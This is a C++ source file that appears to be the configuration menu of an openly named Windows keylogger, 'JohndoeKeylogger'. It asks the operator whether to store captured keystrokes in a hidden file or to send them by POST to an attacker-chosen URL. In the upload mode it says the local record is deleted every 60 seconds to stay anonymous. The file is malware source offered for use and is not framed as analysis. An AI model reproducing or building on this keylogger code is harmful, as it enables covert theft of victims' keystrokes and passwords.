#include "Choice.hpp"
#include <iostream>
using namespace std;

void Choice::askChoice()
{
	cout << "\r\n";
	cout << "Welcome into JohndoeKeylogger\r\n\r\n";
	cout << "/!\\ Works only WINDOWS PLATFORM and special characters are ONLY for french keyboard\r\n\r\n";
	cout << "[+] There are two ways to load the program :\r\n\r\n";
	cout << "[1]: Write input into file \r\n";
	cout << "[2]: Send information with a website intermediate to receive information\r\n\r\n";
	cout << "[+] The default choice is 1. But we are free in this session\r\n";
	cout << "[+] So type your choice: ";
	cin >> c;
	cout << "\r\n";
	if (getChoice() != 2) {
		setChoice(1);
	}
	

}

int Choice::getChoice()
{
	return c;
}

void Choice::setChoice(int choice)
{
	c = choice;
}

string Choice::getSite()
{
	return website;
}

void Choice::setSite(string site)
{
	website = site;
}

void Choice::setConfig()
{
	if(getChoice() == 1){
		cout << "[+] Okay but i have to tell you, the record file will be hidden in the folder where you launch the exe application. \r\n";
		cout << "[+] I hope you know how to show the file dog.\r\n";
		cout << "[+] Type the name of file : ";
		cin >> fileName;
		cout << "\r\n";
	}
	else {
		cout << "[+] Oh nice way to be more anonymous. I hope you have visited the code for know the POST parameter sent by keylogger. \r\n";
		cout << "[+] If not, it's not a good choice hehehehehe.\r\n";
		cout << "[+] Sorry my bad i'm done \r\n";
		cout << "[+] Type your url : ";
		cin >> website;
		cout << "\r\n";
		cout << "[+] Okay but i have to tell you, the record file will be DELETE after each 60 seconds.Before the information will be sent to your URL.\r\n";
		cout << "[+] Type the name of file : ";
		cin >> fileName;
		cout << "\r\n";
	}
	setFile(getFile());

}

string Choice::getFile()
{
	return fileName;
}

void Choice::setFile(string file)
{
	fileName = file+".txt";

}







